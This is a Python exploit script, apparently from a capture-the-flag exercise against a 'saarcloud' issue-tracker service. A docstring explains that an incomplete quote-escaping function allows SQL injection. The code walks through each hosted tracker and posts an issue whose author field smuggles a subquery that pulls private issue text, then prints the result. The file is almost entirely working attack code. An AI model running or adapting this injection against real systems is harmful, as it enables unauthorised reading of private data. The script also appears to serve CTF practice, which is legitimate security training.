import random
import re
import socket
import string

import requests
import sys


"""
The sqlite escape function in library.js is incomplete at escaping strings.
It replaces only the first occurence of ', not all.
We can use that to do sql injection into issue trackers hosted on saarcloud.
"""


def random_string(length=12):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))


class SaarCloudSession(requests.Session):
    def __init__(self, ip: str, hostname='default'):
        super().__init__()
        if hostname == 'default':
            hostname = 'www'
        if '.' not in ip:
            ip = socket.gethostbyname(ip)
        self.base = f'http://{hostname}.{ip}.nip.io:8080'

    def get(self, url, **kwargs):
        if url.startswith('/'):
            url = self.base + url
        return super().get(url, **kwargs)

    def post(self, url, **kwargs):
        if url.startswith('/'):
            url = self.base + url
        return super().post(url, **kwargs)


def exploit(target):
    session = SaarCloudSession(target)
    users = session.get('/api/featured').json()['rds']

    for user in users:
        session = SaarCloudSession(target, user['name'])
        prefix = re.findall(r'fetch\("/(\w+)/issues"\)', session.get('/').text)
        print('USER', user['name'], 'prefix', prefix[0])

        attack_issue = {
            "title": random_string(12), "text": random_string(24),
            "author": "''||(SELECT text FROM appendonly_issues WHERE NOT public ORDER BY created LIMIT 1)||'",
            "public": False
        }
        response = session.post(f'/{prefix[0]}/issues', json=attack_issue)
        ident = response.json()['id']
        print(session.get(f'/{prefix[0]}/issues/{ident}').json()['issue']['author'])


if __name__ == '__main__':
    exploit(sys.argv[1] if len(sys.argv) > 1 else '127.1.0.1')
